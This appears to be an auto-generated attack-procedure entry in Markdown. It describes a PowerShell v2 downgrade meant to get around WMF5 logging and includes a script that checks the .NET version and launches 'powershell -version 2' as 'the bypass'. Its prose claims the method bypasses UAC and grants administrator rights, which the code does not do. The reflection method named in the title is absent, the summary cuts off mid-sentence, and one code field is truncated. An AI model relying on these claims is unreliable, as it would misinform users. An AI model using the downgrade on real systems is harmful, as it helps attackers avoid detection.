---
id: cb2b4945-7a2b-48ac-9589-5edb5c49a34a
name: Reflection Method with WMF5 Autologging Bypass using PowerShell v2
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.102057+00:00'
updated_at: '2023-04-10T20:36:19.361163+00:00'
tags:
- '[[Using Matt Graebers Reflection method with WMF5 autologging bypass]]'
- '[[Using PowerShell version 2]]'
commands:
- '[[Check .Net version 2.0.50727 and run PowerShell v2]]'
---

# Reflection Method with WMF5 Autologging Bypass using PowerShell v2

## Summary

This procedure leverages Matt Graeber's Reflection method with WMF5 autologging bypass to execute PowerShell v2. This method allows an attacker to bypass User Account Control (UAC) and execute PowerShell v2 as an administrator. This technique can be used to escalate privileges and perform malicious

## Description

# Description

This procedure leverages Matt Graeber's Reflection method with WMF5 autologging bypass to execute PowerShell v2. This method allows an attacker to bypass User Account Control (UAC) and execute PowerShell v2 as an administrator. This technique can be used to escalate privileges and perform malicious activities on a compromised system.

From a technical perspective, this procedure first checks for the .Net version 2.0.50727 and then executes PowerShell v2. This allows the attacker to bypass UAC and execute PowerShell v2 with elevated privileges. From a business perspective, this procedure can be used by an attacker to gain access to sensitive information, install malware, or perform other malicious activities on a compromised system.

## Requirements

1. Access to the target system

1. Authentication credentials with administrative privileges

## Defense

1. Ensure that all systems are patched and up to date to prevent exploitation of known vulnerabilities

1. Implement and enforce the principle of least privilege to limit the impact of any potential compromise

1. Monitor and analyze system logs for any suspicious activity, such as the execution of PowerShell v2

## Objectives

1. Escalate privileges to gain access to sensitive information

1. Install malware on a compromised system

1. Perform other malicious activities on a compromised system

# Instructions

1. This command checks if .Net version 2.0.50727 is installed on the system. If it is installed, it executes PowerShell v2 and runs scripts from the new PowerShell process. If it is not installed, the command will output a message saying that .Net version 2.0.50727 is not found and PowerShell v2 cannot be started.

**Code**: [[if ($ShowOnly -eq $True)
{
        Write-Output "I]]

> The command uses the Get-ChildItem cmdlet to search for the 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' registry key and retrieves the Version property of the subkeys. The Where-Object cmdlet is used to filter out any subkeys that start with the letter 'S'. The Select-Object cmdlet is used to expand the Version property of the remaining subkeys. The resulting versions are stored in the $versions variable. If the $versions variable contains the string '2.0.50727', the command executes PowerShell v2 by using the powershell.exe command with the -version 2 parameter. If the $versions variable does not contain the string '2.0.50727', the command outputs a message saying that PowerShell v2 cannot be started.

**Command** ([[Check .Net version 2.0.50727 and run PowerShell v2]]):

```powershell
if ($ShowOnly -eq $True)
{
        Write-Output "If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process."
}
else
{
        Write-Verbose "Checking if .Net version 2.0.50727 is installed."
        $versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version
    if($versions -match "2.0.50727")
    {
            Write-Verbose ".Net version 2.0.50727 found."
            Write-Output "Executing the bypass."
            powershell.exe -version 2
    }
    else
    {
            Write-Verbose ".Net version 2.0.50727 not found. Can't start PowerShell v2."
    }
}
```

## Commands Used

- [[Check .Net version 2.0.50727 and run PowerShell v2]]

## Tags

- [[Using Matt Graebers Reflection method with WMF5 autologging bypass]]
- [[Using PowerShell version 2]]
